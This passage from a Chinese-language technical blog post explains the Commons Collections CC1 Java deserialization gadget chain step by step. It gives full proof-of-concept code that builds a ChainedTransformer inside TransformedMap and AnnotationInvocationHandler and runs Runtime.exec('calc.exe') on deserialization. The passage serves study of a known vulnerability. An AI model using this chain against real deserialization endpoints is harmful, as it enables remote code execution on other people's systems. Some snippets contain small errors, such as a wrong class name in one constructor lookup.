&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当调用装饰后的<code>Map</code>的<code>entrySet()</code>方法时，若<code>isSetValueChecking()</code>返回<code>true</code>（默认返回<code>true</code>），则返回<code>EntrySet</code>实例，否则返回原始<code>Map</code>的<code>entrySet()</code>。</p>
+<h4 id="构造代码">构造代码</h4>
+<p>所以构造代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">exec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        HashMap&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line"><span class="comment">//        exec.transform(Runtime.getRuntime());</span></span><br><span class="line">        Map &lt;Object,Object&gt;decorate = TransformedMap.decorate(map, <span class="literal">null</span>, exec);</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;Object, Object&gt; entry : decorate.entrySet()) &#123;</span><br><span class="line">            entry.setValue(Runtime.getRuntime());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Map.Entry&lt;Object, Object&gt; entry : decorate.entrySet()) &#123; ... &#125;</span><br></pre></td></tr></table></figure>
+<p>调用<code>decorate.entrySet()</code>时，触发<code>AbstractInputCheckedMapDecorator.entrySet()</code>, 然后</p>
+<ul>
+<li>创建<code>EntrySet</code>实例（<code>AbstractInputCheckedMapDecorator</code>的静态内部类），包装原始<code>HashMap</code>的<code>entrySet</code>。</li>
+</ul>
+<p><strong>迭代<code>entrySet</code>时的<code>Entry</code>包装</strong></p>
+<p>循环遍历<code>entrySet</code>时，会调用<code>EntrySet.iterator()</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Iterator <span class="title function_">iterator</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">EntrySetIterator</span>(collection.iterator(), parent); <span class="comment">// 创建EntrySetIterator</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>EntrySetIterator</code>（静态内部类）的<code>next()</code>方法会将原始<code>Map.Entry</code>包装为<code>MapEntry</code>（静态内部类）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">next</span><span class="params">()</span> &#123;</span><br><span class="line">    Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry) iterator.next();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">MapEntry</span>(entry, parent); <span class="comment">// 包装为MapEntry</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>此时循环中的<code>entry</code>实际是<code>MapEntry</code>实例，而非原始<code>HashMap</code>的<code>Entry</code>。</li>
+</ul>
+<p><strong><code>entry.setValue()</code>触发转换逻辑</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">entry.setValue(Runtime.getRuntime());</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>调用<code>MapEntry.setValue()</code>（重写的方法）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    value = parent.checkSetValue(value); <span class="comment">// 关键：调用父类的checkSetValue</span></span><br><span class="line">    <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p><code>parent</code>即<code>TransformedMap</code>实例，其<code>checkSetValue</code>方法会调用<code>valueTransformer.transform(value)</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// TransformedMap的checkSetValue实现</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> valueTransformer.transform(value); <span class="comment">// 调用InvokerTransformer的transform</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>最终触发</p>
+<p><code>InvokerTransformer.transform(Runtime.getRuntime())</code>，通过反射执行：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc.exe&quot;</span>); <span class="comment">// 打开计算器</span></span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h2 id="入口点">入口点</h2>
+<h3 id="AnnotationInvocationHandler">AnnotationInvocationHandler</h3>
+<p>接上面一步, 查看何处调用了<code>setValue</code></p>
+<p><img src="/images/image-20251014172431991.png" alt="image-20251014172431991"></p>
+<p>在<code>AnnotationInvocationHandler</code>类的<code>readOject</code>方法中触发. <code>readOject</code>刚好反序列化会自动触发</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readOject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">     <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">     s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">     <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">     <span class="type">AnnotationType</span> <span class="variable">annotationType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         annotationType = AnnotationType.getInstance(type);</span><br><span class="line">     &#125; <span class="keyword">catch</span>(IllegalArgumentException e) &#123;</span><br><span class="line">         <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">     <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">     <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">     <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">         <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> memberValue.getKey();</span><br><span class="line">         Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">         <span class="keyword">if</span> (memberType != <span class="literal">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">             <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> memberValue.getValue();</span><br><span class="line">             <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                   value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                 memberValue.setValue(</span><br><span class="line">                     <span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(</span><br><span class="line">                         value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                             annotationType.members().get(name)));</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>在这个代码中, 要触发<code>memberValue.setValue</code>, 需要</p>
+<p><code>memberType != null</code> , 而<code>memberType </code>来自<code>Class&lt;?&gt; memberType = memberTypes.get(name);</code></p>
+<p><code>memberTypes</code>来自<code>Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</code></p>
+<p>这就类似于我们上面构造的<code>HashMap</code>, 接下来通过<code>Object value = memberValue.getValue();</code>获取Map的值</p>
+<p>并且需要值为<code>value</code>. 当条件都满足后, 触发<code> memberValue.setValue</code></p>
+<p>基于此, 构造代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;String, String&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">       map.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">       <span class="type">InvokerTransformer</span> <span class="variable">exec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">       Map &lt;Object,Object&gt;decorate = TransformedMap.decorate(map, <span class="literal">null</span>, exec);</span><br><span class="line"></span><br><span class="line">       Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AbstractInputCheckedMapDecorator&quot;</span>);</span><br><span class="line">       Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">       declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Target.class, decorate);</span><br></pre></td></tr></table></figure>
+<p>对<code>AnnotationInvocationHandler</code>的操作</p>
+<p><code>memberValue</code>的值可以控制, 但是<code>setValue</code>中参数有两个是已经写好的. 所以需要使用另外两个<code>Tranfmormer</code>接口的实现来进行修改</p>
+<p><img src="/images/image-20251014183700879.png" alt="image-20251014183700879"></p>
+<h3 id="ConstantTransformer">ConstantTransformer</h3>
+<p>在<code>ConstantTransformer</code>类中</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> iConstant;java</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>他的<code>transform</code>方法不管传入的是什么, 最后返回的都是构造时传入的对象</p>
+<h3 id="ChainedTransformer">ChainedTransformer</h3>
+<p>这个<code>Transformer</code>接口实现类的构造方法和<code>transformer</code>方法如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>从代码可见：</p>
+<ul>
+<li><strong>构造方法</strong>：接收一个<code>Transformer[]</code>数组，将其存储在<code>iTransformers</code>字段中，用于后续调用。</li>
+<li><strong><code>transform</code>方法</strong>：按顺序循环调用数组中每个<code>Transformer</code>的<code>transform</code>方法，将前一个<code>transform</code>的返回值作为下一个的输入（<code>object = iTransformers[i].transform(object)</code>），最终最终结果。</li>
+</ul>
+<p>CC1 链通过<code>ChainedTransformer</code>将多个<code>InvokerTransformer</code>（如<code>ConstantConstantTransformer</code>、<code>InvokerTransformer</code>）串联，最终实现<code>Runtime.exec()</code>的调用，具体分工如下：</p>
+<h4 id="1-串联多个Transformer，完成反射调用链">1. <strong>串联多个<code>Transformer</code>，完成反射调用链</strong></h4>
+<p>典型的 CC1 链中，<code>ChainedTransformer</code>的<code>iTransformers</code>数组会包含 4 个<code>Transformer</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="comment">// 1. 返回Runtime.class</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="comment">// 2. 反射调用Runtime.class.getMethod(&quot;getRuntime&quot;)</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="comment">// 3. 反射调用getRuntime()方法，获取Runtime实例</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">    <span class="comment">// 4. 反射调用Runtime.exec(&quot;calc.exe&quot;)</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, </span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br></pre></td></tr></table></figure>
+<p><code>chain.transform(null)</code>的执行流程：</p>
+<ul>
+<li>第 1 步：<code>ConstantTransformer.transform(null)</code> → 返回<code>Runtime.class</code>。</li>
+<li>第 2 步：<code>InvokerTransformer.transform(Runtime.class)</code> → 调用<code>getMethod(&quot;getRuntime&quot;)</code>，返回<code>Method</code>对象（<code>Runtime.getRuntime()</code>方法）。</li>
+<li>第 3 步：<code>InvokerTransformer.transform(Method对象)</code> → 调用<code>invoke(null)</code>，返回<code>Runtime</code>实例（<code>Runtime.getRuntime()</code>的结果）。</li>
+<li>第 4 步：<code>InvokerTransformer.transform(Runtime实例)</code> → 调用<code>exec(&quot;calc.exe&quot;)</code>，最终执行命令。</li>
+</ul>
+<h4 id="2-将-“单一转换”-升级为-“完整攻击链”">2. <strong>将 “单一转换” 升级为 “完整攻击链”</strong></h4>
+<p>单个<code>InvokerTransformer</code>只能执行一次反射调用，而<code>ChainedTransformer</code>通过循环调用机制，将多个<code>InvokerTransformer</code>的功能串联，实现了从 “获取<code>Runtime</code>类”→“获取<code>getRuntime</code>方法”→“获取<code>Runtime</code>实例”→“执行<code>exec</code>” 的完整流程。</p>
+<p>如果没有<code>ChainedTransformer</code>，需要手动依次调用每个<code>Transformer</code>的<code>transform</code>方法，而有了它，只需调用一次<code>chain.transform(input)</code>，即可自动完成整个调用链。</p>
+<h4 id="3-适配TransformedMap的触发机制">3. <strong>适配<code>TransformedMap</code>的触发机制</strong></h4>
+<p>CC1 链中，<code>ChainedTransformer</code>会被设置为<code>TransformedMap</code>的<code>valueTransformer</code>。当<code>TransformedMap</code>的<code>setValue</code>被触发时（如<code>AnnotationInvocationHandler.readObject()</code>中），会自动调用<code>chain.transform(value)</code>，进而触发整个命令执行链。</p>
+<p><code>ChainedTransformer</code>的存在使得<code>TransformedMap</code>的单一<code>transform</code>调用能够承载复杂的多步操作，从而将 “<code>setValue</code>触发” 与 “命令执行” 连接起来。</p>
+<p>基于上面的分析, 最终构造完整CC1链代码</p>
+<h2 id="完整代码">完整代码</h2>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">////        Runtime.getRuntime().exec(&quot;calc.exe&quot;);</span></span><br><span class="line"><span class="comment">//        InvokerTransformer exec = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc.exe&quot;&#125;);</span></span><br><span class="line"><span class="comment">//        HashMap&lt;String, String&gt; map = new HashMap&lt;&gt;();</span></span><br><span class="line"><span class="comment">//        map.put(&quot;key&quot;, &quot;value&quot;);</span></span><br><span class="line"><span class="comment">////        exec.transform(Runtime.getRuntime());</span></span><br><span class="line"><span class="comment">//        Map &lt;Object,Object&gt;decorate = TransformedMap.decorate(map, null, exec);</span></span><br><span class="line"><span class="comment">//        for (Map.Entry&lt;Object, Object&gt; entry : decorate.entrySet()) &#123;</span></span><br><span class="line"><span class="comment">//            entry.setValue(Runtime.getRuntime());</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">// 1. 返回Runtime.class</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// 2. 反射调用Runtime.class.getMethod(&quot;getRuntime&quot;)</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">// 3. 反射调用getRuntime()方法，获取Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,  <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">// 4. 反射调用Runtime.exec(&quot;calc.exe&quot;)</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;value&quot;</span>);</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">exec</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        Map &lt;Object,Object&gt;decorate = TransformedMap.decorate(map, <span class="literal">null</span>, chain);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; declaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> declaredConstructor.newInstance(Target.class, decorate);</span><br><span class="line">        serialize(o);</span><br><span class="line">        deserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">deserialize</span><span class="params">(String file)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="1-Transformer链构造阶段">1. Transformer链构造阶段</h3>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">    new ConstantTransformer(Runtime.class),</span><br><span class="line">    new InvokerTransformer(&quot;getMethod&quot;, </span><br><span class="line">        new Class[]&#123;String.class, Class[].class&#125;, </span><br><span class="line">        new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;),</span><br><span class="line">    new InvokerTransformer(&quot;invoke&quot;, </span><br><span class="line">        new Class[]&#123;Object.class, Object[].class&#125;, </span><br><span class="line">        new Object[]&#123;null, new Object[0]&#125;),</span><br><span class="line">    new InvokerTransformer(&quot;exec&quot;,</span><br><span class="line">        new Class[]&#123;String.class&#125;,</span><br><span class="line">        new Object[]&#123;&quot;calc.exe&quot;&#125;)</span><br><span class="line">&#125;;</span><br><span class="line">ChainedTransformer chain = new ChainedTransformer(transformers);</span><br></pre></td></tr></table></figure>
+<p><strong>执行流程分解</strong>：</p>
+<ol>
+<li>
+<p><strong>ConstantTransformer(Runtime.class)</strong> 作用：固定返回Runtime.class对象 等效代码：<code>return Runtime.class;</code></p>
+</li>
+<li>
+<p><strong>InvokerTransformer(“getMethod”)</strong></p>
+<ul>
+<li>
+<p>参数：方法名&quot;getMethod&quot;，参数类型数组，参数值数组</p>
+</li>
+<li>
+<p>执行逻辑：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.class.getMethod(&quot;getRuntime&quot;, new Class[0]);</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>结果：返回Runtime.getRuntime()方法对象</p>
+</li>
+</ul>
+</li>
+<li>
+<p><strong>InvokerTransformer(“invoke”)</strong></p>
+<ul>
+<li>
+<p>执行逻辑：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">method.invoke(null, new Object[0]);</span><br></pre></td></tr></table></figure>
+</li>
+<li>
+<p>结果：调用静态方法getRuntime()，返回Runtime实例</p>
+</li>
+</ul>
+</li>
+<li>
